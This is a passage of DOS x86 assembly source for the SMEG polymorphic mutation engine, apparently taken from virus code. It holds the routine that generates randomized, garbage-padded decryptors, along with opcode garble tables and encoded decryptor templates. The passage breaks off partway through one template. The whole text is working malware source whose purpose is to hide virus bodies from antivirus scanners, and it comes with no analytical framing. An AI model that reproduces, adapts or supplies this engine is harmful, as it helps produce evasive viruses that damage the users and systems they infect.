;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
SMEG:
        mov      bx,offset(dataarea_for_SMEG-virus)
        mov      ds:[bx+datasize-dataarea_for_SMEG],cx    ; save length to crypt
        mov      ds:[bx+sourceptr-dataarea_for_SMEG],dx   ; save offset to data to crypt
        mov      ds:[bx+targetptr-dataarea_for_SMEG],di   ; save offset to where to put crypted stuff
        add      bx,6
        mov      cx,28h-6h              ; clear the work area with 0's
        push     bx
clear_dataarea:
        mov      [bx],ch
        inc      bx
        loop     clear_dataarea
        ;--------------
        mov      ds:[initialIP-virus],ax       ; store initial IP
        mov      bx,offset(use_regs_tbl-virus)
        mov      ax,23d
        call     random_ax
        xlat     ;AL=[BX+AL]
        pop      bx
        mov      cx,4h
fill_registers:
        xor      dl,dl                   ; fill in which registers
        rcl      al,1                    ; do which job
        rcl      dl,1
        rcl      al,1
        rcl      dl,1
        mov      [bx],dl
        inc      bx
        loop     fill_registers

        mov      byte ptr [bx],5         ; use BP as a garbling register
        inc      bx
        inc      bx
        mov      dx,1h
        call     random_dx
        add      dl,6h
        mov      [bx],dl                 ; register
        xor      dl,1                    ; flip to the other one
        cmp      byte ptr [bx-3],3       ; is it BX?
        jne      is_not_bx
        mov      [bx-3],dl
        mov      dl,3
is_not_bx:
        mov      [bx+1],dl
        mov      dl,[bx-3]
        mov      [bx-1],dl
gen_cryptval:
        call     random_any_dx
        or       dl,dl
        jz       gen_cryptval
        mov      ds:[cryptval-virus],dl        ; store encryption value

        call     random_any_dx           ; get a random value for the
        inc      dx                      ; offset of memory references,
        mov      ds:[ptr_offsets-virus],dx     ; i.e. the XXXX in [bp+XXXX]

        mov      dx,3h
        call     random_dx               ; do the following from
        add      dx,3h                   ; 3..7 times
        xchg     cx,dx
begin_garble:
        push     cx
        call     garble_more
        call     random_ax
        cmp      al,8Ch
        jbe      no_int21
        mov      ax,(number_of_fnc21-1)
        call     random_ax
        add      ax,offset(int21fcns-virus)
        xchg     si,ax
        mov      ah,0B4h
        lodsb
        xchg     ah,al
        stosw    ;AX -> DS:SI
        mov      ax,21CDh
        stosw    ;AX -> DS:SI
no_int21:
        pop      cx
        loop     begin_garble
        mov      al,0E8h
        stosb
        push     di                      ; write garbage for offset
        stosw                            ; of call for now
        call     garble_more             ; encode some garbage
        mov      al,0E9h                 ; encode a JMP
        stosb
        pop      bx
        push     di
        stosw
        push     di
        pop      ax
        dec      ax
        dec      ax
        sub      ax,bx
        mov      [bx],ax                 ; patch CALL to point to
                                         ; space past the JMP where we
        call     garble_more             ; encode a garbage subroutine
        mov      al,0C3h                 ; encode a RETN
        stosb
        pop      bx
        push     di
        pop      ax
        dec      ax
        dec      ax
        sub      ax,bx
        mov      [bx],ax                 ; Make JMP go past subroutine
        call     encode_routine          ; encode the routine!
        mov      si,offset(dataarea_for_SMEG-virus+8)
                                         ; default to using data temp
                                         ; storage register to return
                                         ; to top of loop
        and      al,al                   ; check return code of routine
        jnz      how_to_top
        dec      si                      ; if 0, instead use encryption
        dec      si                      ; value register to return
how_to_top:
        mov      al,75h                  ; encode JNZ
        stosb
        inc      di
        push     di
        call     garble_some
        pop      bx
        mov      al,0E9h                ; encode a JMP
        stosb
        push     di
        inc      di                      ; skip the offset for now
        inc      di
        mov      ax,di
        sub      ax,bx
        mov      [bx-1],al               ; patch the JNZ
        call     garble_some
        call     random_any_ax
        and      ax,3                    ; first entry requires
        add      ax,ax                   ; no register setup, so
        jz       no_setup                ; jmp past it
        push     ax
        mov      al,0B8h
        or       al,[si]                 ; MOV word-reg, XXXX
        stosb
        mov      ax,ds:[loop_top-virus]
        sub      ax,ds:[targetptr-virus]
        add      ax,ds:[initialIP-virus]
        stosw
        call     garble_some
        pop      ax
no_setup:
        add      ax,offset(jmp_table-virus)
        xchg     bx,ax
        mov      bx,[bx]
        call     bx                      ; encode method of returning
        stosw    ;AX->DS:[DI]            ; to the top of the loop
        pop      bx
        mov      ax,di
        sub      ax,bx
        dec      ax
        dec      ax
        mov      [bx],ax
        call     garble_more
pad_paragraph:
        mov      ax,di                   ; pad the decryptor out to the
        sub      ax,ds:[targetptr-virus]       ; nearest paragraph
        and      al,0Fh                  ; do we need to?
        jz       padded                  ; no, we are done
        cmp      al,0Ch                  ; otherwise, still a lot to go?
        ja       one_byte_pad            ; no, do one byte at a time
        call     not_branch_garble       ; else do a nonbranching
        jmp      short pad_paragraph     ; instruction
one_byte_pad:
        call     random_any_ax           ; do a random one byte padding
        call     do_one_byte             ; instruction
        jmp      short pad_paragraph
padded:
        mov      bx,offset(dataarea_for_SMEG-virus)
        mov      ax,di
        sub      ax,ds:[bx+targetptr-dataarea_for_SMEG]
        mov      ds:[bx+decryptor_size-dataarea_for_SMEG],ax
        add      ax,ds:[bx+initialIP-dataarea_for_SMEG]
        mov      cx,ds:[bx+pointer_fixup-dataarea_for_SMEG]
        sub      ax,cx
        mov      bx,ds:[bx+pointer_patch-dataarea_for_SMEG]
        mov      [bx],ax
        mov      bl,ds:[crypt_type-virus]      ; get encryption type so
        mov      cl,3                    ; the initial value of the
        ror      bl,cl                   ; counter can be calculated
        and      bx,0Fh
        add      bx,offset(counter_init_table-virus)
        mov      ax,ds:[datasize-virus]
        mov      bx,[bx]
        call     bx
        mov      bx,ds:[counter_patch-virus]   ; patch the value of the
        mov      [bx],ax                 ; counter as needed
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
write_table:
        dw       offset(write_nothing-virus)
        dw       offset(write_cryptval-virus)
        dw       offset(write_pointer_patch-virus)
        dw       offset(write_counter_patch-virus)
        dw       offset(write_ptr_offset-virus)
        dw       offset(write_dl-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; In the following table, each pair of bits represents a register
; in standard Intel format, i.e. 00 = ax, 01 = cx, 10 = dx, 11 = bx
use_regs_tbl:
        db       00011011b ; ax cx dx bx
        db       11000110b ; bx ax cx dx
        db       10110001b ; dx bx ax cx
        db       01101100b ; cx dx bx ax
        db       11100100b ; bx dx cx ax
        db       00111001b ; ax bx dx cx
        db       01001110b ; cx ax bx dx
        db       10010011b ; dx cx ax bx
        db       01001011b ; cx ax dx bx
        db       11010010b ; bx cx ax dx
        db       10110100b ; dx bx cx ax
        db       00101101b ; ax dx cx bx
        db       11100001b ; bx dx ax cx
        db       01111000b ; cx bx dx ax
        db       00011110b ; ax cx bx dx
        db       10000111b ; dx ax cx bx
        db       00100111b ; ax dx cx bx
        db       11001001b ; bx ax dx cx
        db       01110010b ; cx bx ax dx
        db       10011100b ; dx cx bx ax
        db       11011000b ; dx ax bx cx
        db       00110110b ; ax bx cx dx
        db       10001101b ; bx cx dx ax
        db       01100011b ; cx dx ax bx
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
onebyte_table:
        dec      ax
        inc      ax
        clc
        cld
        cmc
        stc
        inc      ax
        dec      ax
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; high byte holds the opcode, low byte holds the second byte of the
; instruction, i.e. holds the reg/mod, etc. the bottom 2 bits of the low
; byte hold the maximum amount to add to the high byte in creating the
; instruction. This allows one word to generate more than one instruction,
; including the byte or word forms of the instructions
; note that this is reverse of what will be actually stored
garble_table:
        dw       80F1h   ;  XOR reg, XXXX
        dw       3201h   ;  XOR reg, [reg]
        dw      0F6C1h   ; TEST reg, XXXX
        dw       8405h   ; TEST/XCHG reg, [reg]
        dw       80E9h   ;  SUB reg, XXXX        (2 diff encodings)
        dw       2A01h   ;  SUB reg, [reg]
        dw      0D0EBh   ;  SHR reg, 1
        dw       1A01h   ;  SBB reg, [reg]
        dw       80D9h   ;  SBB reg, XXXX
        dw       80D1h   ;  ADC reg, XXXX
        dw      0D0FBh   ;  SAR reg, 1/CL
        dw      0D0E3h   ;  SHL reg, 1/CL
        dw      0D0CBh   ;  ROR reg, 1/CL
        dw      0D0C3h   ;  ROL reg, 1/CL
        dw       8405h   ; TEST/XCHG reg, [reg]
        dw      0D0DBh   ;  RCR reg, 1/CL
        dw      0C6C1h   ;  MOV reg, XXXX
        dw      080C9h   ;   OR reg, XXXX
        dw       0A01h   ;   OR reg, [reg]
        dw      0F6D1h   ;  NOT reg
        dw      0F6D9h   ;  NEG reg
        dw       8A01h   ;  MOV reg, [reg]
        dw      0C6C1h   ;  MOV reg, XXXX
        dw       0201h   ;  ADD reg, [reg]
        dw       80C1h   ;  ADD reg, XXXX
        dw       80FDh   ;  CMP reg, XXXX
        dw       3807h   ;  CMP reg, [reg]       (2 diff encodings)
        dw       80E1h   ;  AND reg, XXXX
        dw      0D0D3h   ;  RCL reg, 1/CL
        dw       2201h   ;  AND reg, [reg]
        dw       1201h   ;  ADC reg, [reg]
        dw       8A01h   ;  MOV reg, [reg]
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
number_of_fnc21=11
int21fcns db     0Dh,19h,2Ah,2Ch,2Eh,30h,3Dh,41h,4Dh,54h,62h
        ;0Dh,2Eh,3Dh,41h,4Dh,54h,62h
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
counter_init_table:
        dw       offset(counterinit0-virus)
        dw       offset(counterinit1-virus)
        dw       offset(counterinit2-virus)
        dw       offset(counterinit3-virus)
        dw       offset(counterinit4-virus)
        dw       offset(counterinit5-virus)
        dw       offset(counterinit6-virus)
        dw       offset(counterinit7-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_table:
        dw      offset(use_as_is-virus)
        dw      offset(fill_mod_field-virus)
        dw      offset(fill_field-virus)
        dw      offset(fill_reg_reg1-virus)
        dw      offset(fill_reg_field-virus)
        dw      offset(fill_mod_n_reg-virus)
        dw      offset(fill_reg_reg2-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_tbl1:
        db       8h,8Ch,0,0C8h,4,0       ; 1 MOV reg0, CS
        db       8h,8Eh,0,0D8h,4,0       ; 2 MOV DS, reg0
        db       7h,0B8h,4,-1,0,2        ; 3 MOV reg7,initial pointer
        db       1h,0B8h,4,-1,0,3        ; 4 MOV reg1,initial counter
        db       57h,8Ah,0,80h,5,4       ; 5 MOV reg2,[reg7+offset]
        db       57h,88h,0,80h,5,4       ; 6 MOV [reg7+offset],reg2
        db       2h,80h,0,0F0h,4,1       ; 7 XOR reg2,cryptvalue
        db       11h,8Bh,0,0C0h,5,0      ; 8 MOV reg2,reg1
        db       78h,30h,0,0,6,0         ; 9 XOR [reg7],reg0
        db       47h,0F6h,0,98h,4,4      ; A NEG [reg7+offset]
        db       47h,0F6h,0,90h,4,4      ; B NOT [reg7+offset]
        db       7,40h,4,-1,0,0          ; C INC reg7
        db       1,48h,4,-1,0,0          ; D DEC reg1
        db       8h,0B0h,4,-1,0,1        ; E MOV reg0,cryptval
        db       10h,33h,0,0C0h,5,0      ; F XOR reg2,reg0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_tbl2:
        db       47h,86h,0,80h,5,4        ; 1 XCHG reg0,[reg7+offset]
        db       8h,40h,4,-1,0,0          ; 2 INC reg0
        db       8h,48h,4,-1,0,0          ; 3 DEC reg0
        db       7h,81h,0,0C0h,4,15h      ; 4 ADD reg7,1
        db       1,81h,0,0E8h,4,15h       ; 5 SUB reg1,1
        db       10h,2,0,0C0h,5,0         ; 6 ADD reg2,reg0
        db       10h,2Ah,0,0C0h,5,0       ; 7 SUB reg2,reg0
        db       47h,0FBh,4,0B0h,4,4      ; 8 PUSH [reg7+offset]
        db       47h,8Fh,0,80h,4,4        ; 9 POP  [reg7+offset]
        db       8h,50h,4,-1,0,0          ; A PUSH reg0
        db       8h,58h,4,-1,0,0          ; B POP reg0
        db       10h,87h,0,0C0h,5,0       ; C XCHG reg2,reg0
        db       2,40h,4,-1,0,0           ; D INC reg2
        db       8,8Bh,0,0C0h,5,0         ; E MOV reg1,reg0
        db       9,23h,0,0C0h,5,0         ; F AND reg1,reg1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine4:
        db       10h
        ; MOV reg0,CS                   (1)
        ; MOV reg7,initial pointer      (3)
        ; MOV DS,reg0                   (2)
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,encryption value     (E)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; MOV reg2,[reg7+offset]        (5)
        ; XOR reg2,reg0                 (F)
        ; INC reg0                      (02)
        ; MOV [reg7+offset],reg2        (6)
        ; INC reg7                      (C)
        ; DEC reg1                      (D)
        ; done                          (-1)
        db       13h,24h,0EFh,05h,0F0h,26h,0CDh,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine8:
        db       71h
        ; MOV reg7,initial pointer      (3)
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; MOV reg0,encryption value     (E)
        ; beginning of loop             (0)
        ; DEC reg1                      (D)
        ; NEG [reg7+offset]             (A)
        ; DEC reg1                      (D)
        ; MOV reg2,[reg7+offset]        (5)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; DEC reg0                      (03)
        ; ADD reg7,1                    (04)
        ; SUB reg1,1                    (05)
        ; DEC reg0                      (03)
        ; SUB reg1,1                    (05)
        ; done                          (-1)
        db       34h,12h,0EEh,0Dh,0ADh,5Fh,60h,30h,40h,50h,30h,50h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine1:
        db       42h
        ; MOV reg1,initial counter      (4)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,CS                   (1)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg0,encryption value     (E)
        ; MOV reg0,encryption value     (E)
        ; XCHG reg2,reg0                (0C)
        ; MOV DS,reg0                   (2)
        ; beginning of loop             (0)
        ; XCHG reg0,[reg7+offset]       (01)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; MOV reg2,reg1                 (8)
        ; MOV reg2,reg1                 (8)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; DEC reg0                      (03)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; ADD reg7,1                    (04)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        ; return code 0                 (0)
        db       43h,10h,0CEh,0E0h,0C2h,0,1Fh,68h,80h,0D0h,0D0h,0D0h
        db       30h,0C0h,0E0h,40h,0F0h,-1,0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineC:
        db       33h
        ; MOV reg0,CS                   (1)
        ; MOV reg1,initial counter      (4)
        ; MOV DS,reg0                   (2)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,encryption value     (E)
        ; MOV reg0,encryption value     (E)
        ; beginning of loop             (0)
        ; DEC reg1                      (D)
        ; DEC reg1                      (D)
        ; NOT [reg7+offset]             (B)
        ; MOV reg2,[reg7+offset]        (5)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; XOR reg2,reg0                 (F)
        ; INC reg7                      (C)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; XOR reg2,reg0                 (F)
        ; done                          (-1)
        db       14h,23h,0EEh,0Dh,0DBh,5Fh,6Fh,0C0h,20h,20h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineE:
        db       64h
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; MOV reg7,initial pointer      (3)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; XOR [reg7],reg0               (9)
        ; MOV reg2,reg1                 (8)
        ; XCHG reg2,reg0                (0C)
        ; INC reg0                      (02)
        ; INC reg2                      (0D)
        ; INC reg0                      (02)
        ; ADD reg7,1                    (04)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; MOV reg1,reg0                 (0E)
        ; INC reg2                      (0D)
        ; XCHG reg2,reg0                (0C)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       41h,2Eh,3Fh,9h,80h,0C0h,20h,0D0h,20h,40h,20h,20h
        db       0E0h,0D0h,0C0h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine2:
        db       5h
        ; MOV reg0,CS                   (1)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg1,initial counter      (4)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; DEC reg1                      (D)
        ; XOR reg2,encryption value     (7)
        ; PUSH reg0                     (0A)
        ; PUSH [reg7+offset]            (08)
        ; POP reg0                      (0B)
        ; XCHG reg2,reg0                (0C)
        ; POP reg0                      (0B)
        ; PUSH reg0                     (0A)
        ; SUB reg2,reg0                 (07)
        ; MOV [reg7+offset],reg2        (6)
        ; INC reg7                      (C)
        ; MOV reg2,reg1                 (8)
        ; MOV reg2,reg1                 (8)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; POP reg0                      (0B)
        ; INC reg0                      (02)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       13h,42h,0EFh,0Dh,70h,0A0h,80h,0B0h,0C0h,0B0h,0A0h
        db       76h,0C8h,80h,0D0h,0D0h,0C0h,0E0h,0B0h,20h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineF:
        db       56h
        ; MOV reg7,initial pointer      (3)
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; beginning of loop             (0)
        ; MOV reg2,[reg7+offset]        (5)
        ; INC reg2                      (0D)
        ; ADD reg2,reg0                 (06)
        ; MOV [reg7+offset],reg2        (6)
        ; MOV reg2,reg1                 (8)
        ; DEC reg0                      (03)
        ; XOR reg2,reg0                 (F)
        ; DEC reg1                      (D)
        ; INC reg7                      (C)
        ; DEC reg1                      (D)
        ; done                          (-1)
        db       34h,12h,2Eh,5h,0D0h,66h,80h,3Fh,0DCh,0D0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine9:
        db       27h
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,CS                   (1)
        ; MOV reg7,initial pointer      (3)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; XOR [reg7],reg0               (9)
        ; XOR reg2,reg0                 (F)
        ; ADD reg7,1                    (04)
        ; PUSH reg0                     (0A)
        ; MOV reg2,reg1                 (8)
        ; DEC reg1                      (D)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; POP reg0                      (0B)
        ; DEC reg0                      (03)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       41h,32h,0EFh,9h,0F0h,40h,0A8h,0D0h,0D0h,0D0h
        db       0C0h,0E0h,0B0h,30h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine7:
        db       32h
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,CS                   (1)
        ; MOV reg7,initial pointer      (3)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; XCHG reg2,reg0                (0C)
        ; beginning of loop             (0)
        ; MOV reg2,reg1                 (8)
        ; DEC reg1                      (D)
        ; POP reg0                      (0B)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; DEC reg0                      (03)
        ; XCHG reg2,reg0                (0C)
        ; ADD reg7,1                    (04)
        ; DEC reg1                      (D)
        ; done                          (-1)
        ; return code 0                 (0)
        db       41h,32h,0E0h,0C0h,8h,0D0h,0BFh,60h,30h,0C0h,4Dh,-1,0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine5:
        db       11h
        ; MOV reg1,initial counter      (4)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; NEG [reg7+offset]             (A)
        ; MOV reg2,[reg7+offset]        (5)
        ; XOR reg2,reg0                 (F)
        ; DEC reg1                      (D)
        ; DEC reg0                      (03)
        ; DEC reg0                      (03)
        ; XCHG reg2,reg0                (0C)
        ; XCHG reg0,[reg7+offset]       (01)
        ; XCHG reg2,reg0                (0C)
        ; ADD reg7,1                    (04)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       43h,12h,0EFh,0Ah,5Fh,0D0h,30h,30h,0C0h,10h,0C0h,40h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineB:
        db       66h
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,CS                   (1)
        ; MOV reg1,initial counter      (4)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; PUSH reg0                     (0A)
        ; PUSH [reg7+offset]            (08)
        ; MOV reg2,reg1                 (8)
        ; MOV reg2,reg1                 (8)
        ; XCHG reg2,reg0                (0C)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; MOV reg1,reg0                 (0E)
        ; POP reg0                      (0B)
        ; XCHG reg2,reg0                (0C)
        ; POP reg0                      (0B)
        ; ADD reg2,reg0                 (06)
        ; PUSH reg0                     (0A)
        ; XCHG reg2,reg0                (0C)
        ; PUSH reg0                     (0A)
        ; POP [reg7+offset]             (09)
        ; POP reg0                      (0B)
        ; DEC reg0                      (03)
        ; INC reg7                      (C)
        ; XOR reg2,reg0                 (F)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       31h,42h,0EFh,0,0A0h,88h,80h,0C0h,20h,20h,20h,20h,0E0h
        db       0B0h,0C0h,0B0h,60h,0A0h,0C0h,0A0h,90h,0B0h,3Ch,0F0h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine3:
        db       4h
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; MOV reg2,reg1                 (8)
        ; MOV reg1,initial counter      (4)
        ; MOV reg7,initial pointer      (3)
        ; beginning of loop             (0)
        ; MOV reg2,reg1                 (8)
        ; DEC reg1                      (D)
        ; INC reg2                      (0D)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; XCHG reg2,reg0                (0C)
        ; XOR [reg7],reg0               (9)
        ; INC reg7                      (C)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       12h,0E8h,43h,8,0D0h,0D0h,0C0h,0E0h,0C9h,0C0h,20h,20h
        db       0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineD:
        db       73h
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,CS                   (1)
        ; MOV reg1,initial counter      (4)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; MOV reg1,initial counter      (4)
        ; beginning of loop             (0)
        ; DEC reg1                      (D)
        ; DEC reg1                      (D)
        ; DEC reg1                      (D)
        ; NOT [reg7+offset]             (B)
        ; PUSH reg0                     (0A)
        ; PUSH [reg7+offset]            (08)
        ; POP reg0                      (0B)
        ; XCHG reg2,reg0                (0C)
        ; POP reg0                      (0B)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; INC reg0                      (02)
        ; ADD reg7,1                    (04)
        ; INC reg0                      (02)
        ; SUB reg1,1                    (05)
        ; done                          (-1)
